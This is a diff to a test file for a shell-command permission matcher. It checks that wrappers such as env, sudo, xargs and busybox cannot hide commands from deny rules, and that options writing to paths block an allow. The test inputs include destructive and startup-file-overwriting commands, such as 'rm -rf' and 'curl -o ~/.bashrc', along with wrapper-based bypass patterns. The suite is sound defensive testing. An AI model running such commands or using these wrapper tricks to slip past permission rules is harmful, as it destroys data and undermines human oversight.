@@ -110,6 +110,8 @@ describe("refused prefixes (single shared list)", () => {
     [["source"], "wrapper"],
     [["timeout"], "wrapper"],
     [["nice"], "wrapper"],
+    [["busybox"], "wrapper"],
+    [["git", "config"], "config-writer"],
     [["npx"], "package-runner"],
     [["npm", "exec"], "package-runner"],
     [["bun", "x"], "package-runner"],
@@ -256,6 +258,52 @@ describe("AST shell matcher", () => {
     }
     // Without any deny/ask rule, the same input is simply not allowed.
     expect(evaluateShellRules("bash -c 'rm x'", rules({ allow: ["Bash(echo *)"] })).decision).toBeNull();
+  });
+
+  it("security review: wrappers cannot hide code from deny rules", () => {
+    const set = rules({ deny: ["Bash(rm *)"] });
+    for (const command of [
+      "env sh -c 'rm x'",
+      "nohup bash -c 'rm x'",
+      "timeout 5 sh -c 'rm x'",
+      "xargs -I{} sh -c 'rm {}'",
+      "xargs -I {} sh -c 'rm {}'",
+      "sudo -u root bash -c 'rm x'",
+      "env -S 'rm -rf x'",
+      "su -c 'rm x'",
+      "busybox sh -c 'rm x'",
+    ]) {
+      expect(evaluateShellRules(command, set), command).toMatchObject({ decision: "ask", pattern: null });
+    }
+    expect(evaluateShellRules("busybox rm -rf x", set).decision).toBe("deny");
+    expect(evaluateShellRules("env A=1 busybox rm x", set).decision).toBe("deny");
+  });
+
+  it("security review: deny/ask see through a multi-verb tool's global options", () => {
+    const set = rules({ deny: ["Bash(git push *)"], ask: ["Bash(kubectl delete *)"] });
+    expect(evaluateShellRules("git -C . push origin", set).decision).toBe("deny");
+    expect(evaluateShellRules("git -c core.x=1 --no-pager push", set).decision).toBe("deny");
+    expect(evaluateShellRules("kubectl -n prod delete pod x", set).decision).toBe("ask");
+    expect(evaluateShellRules("git -C . status", set).decision).toBeNull();
+  });
+
+  it("security review: an option that writes to a path disqualifies an allow", () => {
+    const set = rules({ allow: ["Bash(git log *)", "Bash(sort *)", "Bash(curl *)", "Bash(find *)", "Bash(grep *)"] });
+    for (const command of [
+      "git log --output=~/.zshrc",
+      "git log --output ~/.zshrc",
+      "git log --exec-path=/tmp/x",
+      "sort -o ~/.bashrc in.txt",
+      "curl -o ~/.bashrc https://x.test",
+      "find . -fprint ~/.zshrc",
+      "find . -delete",
+    ]) {
+      expect(evaluateShellRules(command, set).decision, command).toBeNull();
+    }
+    expect(evaluateShellRules("git log -n 5 --oneline", set).decision).toBe("allow");
+    expect(evaluateShellRules("grep -o foo file.txt", set).decision).toBe("allow");
+    expect(evaluateShellRules("sort -n in.txt", set).decision).toBe("allow");
+    expect(refusedShellPrefix(["git", "config"])).toBe("config-writer");
   });
 
   it("an interpreter running a script file stays visible to deny rules", () => {
